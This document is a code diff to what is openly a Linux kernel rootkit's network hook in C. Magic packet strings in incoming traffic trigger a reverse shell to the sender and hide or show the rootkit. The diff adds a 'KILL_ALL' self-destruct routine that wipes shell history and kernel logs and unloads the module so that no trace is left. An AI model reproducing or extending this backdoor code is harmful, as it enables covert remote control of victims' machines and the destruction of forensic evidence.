@@ -1,15 +1,19 @@
 #include "h_netfilter.h"
 #include "../revshell.h"
+#include "../selfdestruct.h"
+#include "h_kill.h"
+
 
 const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
 const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
 const char* HIDE_ROOTKIT_KEY_2600 = "2600_HIDE_ROOTKIT";
 const char* SHOW_ROOTKIT_KEY_2600 = "2600_SHOW_ROOTKIT";
+const char* DESTRUCT = "2600_KILL_ALL";
 
-const char* ENCRYPT_DIR_KEY_2600 = "2600_ENCRYPT_DIR";
-#define ENCRYPT_DIR_KEY_BUF_LEN_2600 512
-const char* DECRYPT_DIR_KEY_2600 = "2600_DECRYPT_DIR";
-#define DECRYPT_DIR_KEY_BUF_LEN_2600 512
+// const char* ENCRYPT_DIR_KEY_2600 = "2600_ENCRYPT_DIR";
+// #define ENCRYPT_DIR_KEY_BUF_LEN_2600 512
+// const char* DECRYPT_DIR_KEY_2600 = "2600_DECRYPT_DIR";
+// #define DECRYPT_DIR_KEY_BUF_LEN_2600 512
 
 
 
@@ -111,6 +115,17 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             last_four[4] = '\0';
             printk(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
             start_reverse_shell(ip_source, last_four);
+            return NF_DROP;
+        }else if(memcmp(user_data, DESTRUCT, strlen(DESTRUCT))==0){
+            /****SELFTDESTRUCT - No trace left***/
+            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
+            module_show();
+            kboom();
+            kboom_persistence();
+            flush_history();
+            flush_dmesg();
+            unload();
+            printk(KERN_INFO ":: CALL SELFDESTRUCT WITH TCP FROM %s \n", ip_source);
             return NF_DROP;
         }
         // }else if(memcmp(user_data, 2600_HIDE_ROOTKIT_KEY, strlen(2600_HIDE_ROOTKIT_KEY))==0){
